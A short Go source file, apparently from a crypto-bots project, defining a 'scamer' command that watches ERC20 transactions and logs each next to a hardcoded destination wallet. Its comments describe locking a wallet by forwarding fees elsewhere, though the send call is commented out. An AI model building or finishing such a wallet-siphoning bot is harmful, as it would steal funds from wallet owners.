package main

import (
	"log"

	"github.com/loic-roux-404/crypto-bots/internal/model/transaction"
	"github.com/loic-roux-404/crypto-bots/pkg/icmd"
	"github.com/loic-roux-404/crypto-bots/pkg/networks"
	"github.com/spf13/cobra"
)

func init() {
	icmd.InitNetCmd(&cobra.Command{
		Use:   "scamer",
		Short: "Scamer bot forwarding fees to another wallet",
	})
}

// Lock wallet by transfering fees on other wallet
func main() {
	icmd.ExecuteNetCmd()

	n := networks.GetNetwork("erc20")
	dest := "0xBe20D507fbdD6dAFd7a2ddE95c2d3f4618547F17"

	n.SubscribeCurrent().RunEventLoop(func(tx *transaction.Tx) {
		log.Printf("Info: Forwarding fee to %s", dest)
		log.Println(tx)
		// n.Send(dest, big.NewFloat(0.02))
	})
}
